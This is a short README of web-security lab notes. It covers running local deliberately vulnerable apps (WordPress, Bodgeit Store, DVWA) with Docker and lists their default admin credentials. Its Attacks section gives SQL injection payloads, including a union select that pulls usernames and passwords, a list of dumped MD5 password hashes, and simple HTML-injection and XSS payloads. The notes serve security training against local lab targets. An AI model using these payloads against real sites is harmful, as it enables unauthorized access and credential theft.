# Security Lab Notes

## Start Services

### Wordpress 

`http://127.0.0.1:8030`

```
cd wordpress-docker-compose
docker-compose up
```

### Bodgeit Store

`http://localhost:8050`

username: admin

password: password
```
cd bodgeit
docker-compose up
```

### Damn Vulnerable Web Application 
`http://localhost:8040`
``` 
cd web-dvwa
docker-compose up
```


### Wordpress Admin
```
http://127.0.0.1:8030/wp-admin/
```

## Attacks

### SQL Injection
```sql
' or 1='1

%' and 1=0 union select null, concat(user,':',password) from users #
```

### List of passwords
```
5f4dcc3b5aa765d61d8327deb882cf99
e99a18c428cb38d5f260853678922e03
8d3533d75ae2c3966d7e0d4fcc69216b
0d107d09f5bbe40cade3de5c71e9e9b7
5f4dcc3b5aa765d61d8327deb882cf99
```



### HTML Injection
```html
<marquee><h1>HELLO WORLD</h1></marquee>
```

### XSS Injection
```html
<script>alert("Hacked!")</script>
```


## Credits
[Wordpress Docker Compose](https://github.com/nezhar/wordpress-docker-compose)

[Bodgeit Store](https://github.com/psiinon/bodgeit)

[Damn Vulnerable Web Application](http://dvwa.co.uk/)





